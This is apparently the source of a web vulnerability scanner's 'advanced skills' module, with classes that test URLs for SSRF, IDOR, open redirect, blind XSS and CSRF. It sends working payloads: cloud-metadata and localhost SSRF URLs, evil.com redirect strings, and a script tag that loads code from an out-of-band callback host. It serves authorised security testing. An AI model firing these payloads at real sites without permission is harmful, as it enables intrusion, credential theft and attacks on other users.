"""
Advanced Skills - v1.6 advanced vulnerability testing capabilities.

Contains:
    - SSRFSkill: Server-Side Request Forgery detection
    - IDORSkill: Insecure Direct Object Reference
    - OpenRedirectSkill: Open redirect detection
    - OOBXSSSkill: Blind XSS with Interactsh callbacks
    - CSRFSkill: Cross-Site Request Forgery detection
"""

from typing import Dict, Any
from .base import BaseSkill
from bugtrace.utils.logger import get_logger

logger = get_logger("skills.advanced")


class SSRFSkill(BaseSkill):
    """SSRF exploitation skill - Server-Side Request Forgery detection."""
    
    description = "Test for SSRF by injecting internal URLs and callback endpoints"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs

        findings = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        # Test each parameter for SSRF
        for param_name in query_params:
            if self._is_ssrf_parameter(param_name):
                param_findings = await self._test_ssrf_parameter(url, parsed, query_params, param_name)
                findings.extend(param_findings)

        return {"success": True, "findings": findings}

    def _is_ssrf_parameter(self, param_name: str) -> bool:
        """Check if parameter name suggests SSRF vulnerability."""
        ssrf_params = ["url", "uri", "path", "dest", "redirect", "go", "out", "next", "target", "callback"]
        return any(x in param_name.lower() for x in ssrf_params)

    async def _test_ssrf_parameter(self, url: str, parsed, query_params: dict, param_name: str) -> list:
        """Test a parameter for SSRF vulnerabilities."""
        from urllib.parse import urlencode, urlunparse
        import httpx

        findings = []
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:22/",
            "http://localhost:80/",
            "http://[::1]/",
        ]

        for payload in ssrf_payloads:
            test_params = query_params.copy()
            test_params[param_name] = [payload]

            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
            ))

            finding = await self._check_ssrf_response(url, test_url, param_name, payload)
            if finding:
                findings.append(finding)
                break

        return findings

    async def _check_ssrf_response(self, url: str, test_url: str, param_name: str, payload: str):
        """Check HTTP response for SSRF indicators."""
        import httpx

        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(test_url)
                return self._check_response_for_ssrf_indicators(response, url, test_url, param_name, payload)
        except Exception as e:
            logger.debug(f"SSRF test failed: {e}")
            return None

    def _check_response_for_ssrf_indicators(self, response, url: str, test_url: str, param_name: str, payload: str):
        """Check response text for SSRF indicators."""
        ssrf_indicators = ["ami-id", "instance-id", "localhost", "127.0.0.1"]

        for indicator in ssrf_indicators:
            if indicator in response.text:
                logger.info(f"[{self.master.name}] ✅ SSRF detected: {indicator}")
                return {
                    "type": "SSRF",
                    "url": url,
                    "parameter": param_name,
                    "payload": payload,
                    "evidence": indicator,
                    "severity": "HIGH",
                    "description": f"Server-Side Request Forgery (SSRF) detected. The parameter '{param_name}' allows making requests to internal resources. Indicator found: {indicator}",
                    "reproduction": f"curl '{test_url}' | grep -i '{indicator}'"
                }
        return None


class IDORSkill(BaseSkill):
    """IDOR exploitation skill - Insecure Direct Object Reference detection."""
    
    description = "Test for IDOR by manipulating ID parameters"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs

        findings = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        # Test each ID parameter
        for param_name in query_params:
            if self._is_id_parameter(param_name):
                original_value = query_params[param_name][0]
                param_findings = await self._test_idor_parameter(url, parsed, query_params, param_name, original_value)
                findings.extend(param_findings)

        return {"success": True, "findings": findings}

    def _is_id_parameter(self, param_name: str) -> bool:
        """Check if parameter name suggests ID-based access."""
        id_params = ["id", "user_id", "uid", "account", "order", "file", "doc", "page"]
        return any(x in param_name.lower() for x in id_params)

    def _generate_idor_test_values(self, original_value: str) -> list:
        """Generate test values for IDOR testing."""
        test_values = ["1", "0", "admin", "-1"]

        try:
            int_val = int(original_value)
            test_values.append(str(int_val + 1))
            test_values.append(str(int_val - 1))
        except ValueError:
            pass

        return test_values

    async def _test_idor_parameter(self, url: str, parsed, query_params: dict, param_name: str, original_value: str) -> list:
        """Test a parameter for IDOR vulnerabilities."""
        findings = []
        test_values = self._generate_idor_test_values(original_value)

        for test_val in test_values:
            if test_val == original_value:
                continue

            finding = await self._check_idor_test_value(url, parsed, query_params, param_name, original_value, test_val)
            if finding:
                findings.append(finding)
                logger.info(f"[{self.master.name}] ⚠️ Potential IDOR on {param_name}")
                break

        return findings

    async def _check_idor_test_value(self, url: str, parsed, query_params: dict, param_name: str, original_value: str, test_val: str):
        """Check a single IDOR test value."""
        from urllib.parse import urlencode, urlunparse
        import httpx

        test_params = query_params.copy()
        test_params[param_name] = [test_val]

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params, doseq=True), parsed.fragment
        ))

        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(test_url)
                if response.status_code == 200:
                    return self._build_idor_finding(url, test_url, param_name, original_value, test_val)
        except Exception as e:
            logger.debug(f"IDOR test failed: {e}")

        return None

    def _build_idor_finding(self, url: str, test_url: str, param_name: str, original_value: str, test_val: str) -> dict:
        """Build IDOR finding data structure."""
        return {
            "type": "IDOR (Potential)",
            "url": url,
            "parameter": param_name,
            "original_value": original_value,
            "tested_value": test_val,
            "note": "Manual verification required",
            "severity": "MEDIUM",
            "description": f"Potential Insecure Direct Object Reference (IDOR). Parameter '{param_name}' accepts different ID values ({original_value} → {test_val}) returning 200 OK. Manual verification needed to confirm unauthorized data access.",
            "reproduction": f"# Original: curl '{url}'\n# IDOR test: curl '{test_url}'"
        }


class OpenRedirectSkill(BaseSkill):
    """Open Redirect exploitation skill."""
    
    description = "Test for Open Redirect vulnerabilities"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs

        findings = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        # Test each redirect parameter
        for param_name in query_params:
            if self._is_redirect_parameter(param_name):
                param_findings = await self._test_redirect_parameter(url, parsed, query_params, param_name)
                findings.extend(param_findings)

        return {"success": True, "findings": findings}

    def _is_redirect_parameter(self, param_name: str) -> bool:
        """Check if parameter name suggests redirect functionality."""
        redirect_params = ["url", "redirect", "next", "return", "goto", "target", "dest", "redir"]
        return any(x in param_name.lower() for x in redirect_params)

    async def _test_redirect_parameter(self, url: str, parsed, query_params: dict, param_name: str) -> list:
        """Test a parameter for open redirect vulnerabilities."""
        findings = []
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com%2F%2F",
        ]

        for payload in redirect_payloads:
            finding = await self._check_redirect_payload(url, parsed, query_params, param_name, payload)
            if finding:
                findings.append(finding)
                logger.info(f"[{self.master.name}] ✅ Open Redirect: {finding['redirected_to']}")
                break

        return findings

    async def _check_redirect_payload(self, url: str, parsed, query_params: dict, param_name: str, payload: str):
        """Check a single redirect payload."""
        from urllib.parse import urlencode, urlunparse
        import httpx

        test_params = query_params.copy()
        test_params[param_name] = [payload]

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params, doseq=True), parsed.fragment
        ))

        try:
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
                response = await client.get(test_url)
                location = response.headers.get("location", "")
                if "evil.com" in location:
                    return self._build_redirect_finding(url, test_url, param_name, payload, location)
        except Exception as e:
            logger.debug(f"Open redirect test failed: {e}")

        return None

    def _build_redirect_finding(self, url: str, test_url: str, param_name: str, payload: str, location: str) -> dict:
        """Build open redirect finding data structure."""
        return {
            "type": "Open Redirect",
            "url": url,
            "parameter": param_name,
            "payload": payload,
            "redirected_to": location,
            "severity": "MEDIUM",
            "description": f"Open Redirect vulnerability. Parameter '{param_name}' allows redirecting users to external domains. Server redirects to: {location}",
            "reproduction": f"curl -I '{test_url}' | grep -i location"
        }


class OOBXSSSkill(BaseSkill):
    """OOB XSS skill using Interactsh for blind XSS detection."""
    
    description = "Test for Blind XSS using out-of-band callbacks"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        from urllib.parse import urlparse, parse_qs

        findings = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        # Inject payloads for all parameters
        callback_urls = await self._inject_oob_payloads(url, parsed, query_params)

        # Build finding report
        if callback_urls:
            findings.append(self._build_oob_finding(url, callback_urls))

        return {"success": True, "findings": findings}

    async def _inject_oob_payloads(self, url: str, parsed, query_params: dict) -> list:
        """Inject OOB XSS payloads and return callback URLs."""
        from urllib.parse import urlencode, urlunparse
        from bugtrace.tools.interactsh import get_oob_url
        import httpx

        callback_urls = []

        for param_name in query_params:
            callback = get_oob_url(f"xss_{param_name}")
            callback_urls.append((param_name, callback))

            payload = f'"><script src=http://{callback}/x></script>'

            test_params = query_params.copy()
            test_params[param_name] = [payload]

            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
            ))

            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    await client.get(test_url)
            except Exception as e:
                logger.debug(f"OOB XSS payload injection failed: {e}")

        # Log callback URLs for monitoring
        if callback_urls:
            logger.info(f"[{self.master.name}] OOB XSS payloads sent. Monitor callbacks:")
            for param, cb in callback_urls:
                logger.info(f"  - {param}: {cb}")

        return callback_urls

    def _build_oob_finding(self, url: str, callback_urls: list) -> dict:
        """Build OOB XSS finding data structure."""
        callbacks_dict = {param: cb for param, cb in callback_urls}
        return {
            "type": "Blind XSS (Payload Sent)",
            "url": url,
            "callbacks": callbacks_dict,
            "note": "Monitor Interactsh for callbacks",
            "severity": "INFO",
            "description": f"Blind XSS payloads injected into {len(callback_urls)} parameters. If callbacks are received on Interactsh, XSS is confirmed. Payloads execute when viewed by admin/other users.",
            "reproduction": f"# Monitor these callback URLs for hits:\n" + "\n".join([f"# {p}: {c}" for p, c in callback_urls[:3]])
        }


class CSRFSkill(BaseSkill):
    """CSRF exploitation skill - Cross-Site Request Forgery detection."""
    
    description = "Test for CSRF by analyzing forms for missing anti-CSRF tokens"
    
    async def execute(self, url: str, params: Dict[str, Any]) -> Dict[str, Any]:
        findings = []

        try:
            from bugtrace.tools.visual.crawler import VisualCrawler
            crawler = VisualCrawler()
            crawl_results = await crawler.crawl(url, max_depth=1)

            for form in crawl_results.get("forms", []):
                finding = self._check_form_for_csrf(url, form)
                if finding:
                    findings.append(finding)
                    logger.info(f"[{self.master.name}] ⚠️ Potential CSRF on form: {form.get('action', '')}")

        except Exception as e:
            logger.debug(f"CSRF skill failed: {e}")

        return {"success": True, "findings": findings}

    def _check_form_for_csrf(self, url: str, form: dict):
        """Check a form for CSRF protection."""
        action = form.get("action", "")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        # CSRF is mainly relevant for state-changing methods
        if method == "GET":
            return None

        # Check for CSRF tokens
        if self._has_csrf_token(inputs):
            return None

        return {
            "type": "CSRF (Potential)",
            "url": url,
            "form_action": action,
            "method": method,
            "note": "Form missing apparent CSRF token",
            "severity": "MEDIUM",
            "description": f"Potential Cross-Site Request Forgery (CSRF). Form with action '{action}' uses {method} method but lacks CSRF token protection. State-changing actions may be exploitable.",
            "reproduction": f"# Create CSRF PoC:\n<form action='{action}' method='{method}'>\n  <!-- Add form inputs -->\n  <input type='submit' value='Submit'>\n</form>"
        }

    def _has_csrf_token(self, inputs: list) -> bool:
        """Check if inputs contain a CSRF token."""
        csrf_tokens = ["csrf", "xsrf", "token", "authenticity", "state"]

        for inp in inputs:
            name = (inp.get("name") or "").lower()
            if any(t in name for t in csrf_tokens):
                return True

        return False
